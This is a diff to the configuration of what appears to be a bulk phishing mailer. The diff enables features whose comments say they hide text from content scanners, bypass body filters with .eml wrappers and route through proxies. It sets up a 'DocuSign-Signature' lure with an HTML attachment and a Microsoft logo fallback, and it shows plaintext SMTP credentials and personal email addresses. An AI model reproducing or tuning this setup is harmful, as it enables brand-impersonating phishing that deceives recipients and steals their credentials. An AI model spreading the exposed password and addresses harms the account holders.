@@ -5,14 +5,14 @@
  * This section defines the outbound mail servers used to deliver your messages.
  */
 const smtp = [
-  {
-    "host": "mail.gmx.net",
+ {
+    "host": "smtp-relay.gmail.com",
     "port": 587,
     "secure": false,
-    "username": "charlotte.jager523@gmx.de",
-    "password": "2R!aOZBRT!7PbeI5e510",
-    "from_email": "charlotte.jager523@gmx.de",
-  
+    "username": "ar@candybreak.net",
+    "password": "",
+    "from_email": "abigail.newcamp@therealbrokerage.com",
+   
   },
 ];
 
@@ -36,7 +36,7 @@ const setup = {
   isMultiThread: true, // Enables simultaneous sending processes using multiple CPU cores.
   howManyThread: 2, // Number of parallel processes to run if multi-threading is active.
   
-  LetterToImage: false, // Converts HTML letters into JPEG images to hide text from content scanners.
+  LetterToImage: true, // Converts HTML letters into JPEG images to hide text from content scanners.
   fileName_LetterToImage: "./letterToImage.html", // The HTML template used for the image generation.
   use_multiple_letters: false, // Enables rotation between different HTML templates in the 'multi_letters' list.
   letter: "letter.html", // Default HTML template used when multiple letters are disabled.
@@ -82,8 +82,11 @@ const setup = {
   manage_cloud_accounts: false, // Switch for managing connected cloud or API accounts.
   general_reset_token: false, // Forces a refresh of stored API authentication tokens.
   
-  useAttachment: false, // Global switch to enable or disable file attachments.
+  useAttachment: true, // Global switch to enable or disable file attachments.
   useGrabLogo: false, // Automatically fetches the recipient's corporate logo from their domain.
+  logoWidth: "450px",      // Set the preferred width of the logo (supports 'px' for fixed or '%' for fluid sizing).
+  logoMaxWidth: "500px",   // Defines the upper limit of the logo's width to prevent oversized display on large screens.
+  logoPadding: "10px",     // Adds whitespace around the logo to ensure it doesn't touch the edges of the email or nearby text.
   defaultLogo: "https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31", // Fallback logo URL if auto-grab fails.
   useMylogo: false, // Uses a custom logo file defined in the 'myLOGO' section.
   proxy: "" // SOCKS5 proxy address (e.g., ip:port or user:pass@ip:port).
@@ -145,11 +148,13 @@ const attachment = [
 ];
 
 const attachment_EML = {
-  use_EML: false, // Wraps the message inside an attached .eml file to bypass body filters.
-  attachment_name_EML: "<COMPANYNAME>.eml", // Dynamic filename for the .eml attachment.
-  letter_eml: "EML/letter.html", // The HTML content inside the .eml file.
-  useAttachment_EML: true, // Includes secondary attachments inside the .eml wrapper.
-  attachment: [{ attachmentName: "<COMPANYNAME>.html", path: "EML/attachment.html" }] // Files nested inside the EML.
+  use_EML: true, // Ubah ke true untuk mengaktifkan
+  attachment_name_EML: "<COMPANYNAME>.eml",
+  subject_eml: "Notification from <COMPANYNAME>", // Tambahkan ini
+  from_email_eml: "DocuSign-Signature", // Tambahkan ini
+  letter_eml: "EML/letter.html",
+  useAttachment_EML: true,
+  attachment: [{ attachmentName: "<COMPANYNAME>.html", path: "EML/attachment.html" }]
 };
 
 const generate_QRCODE = {
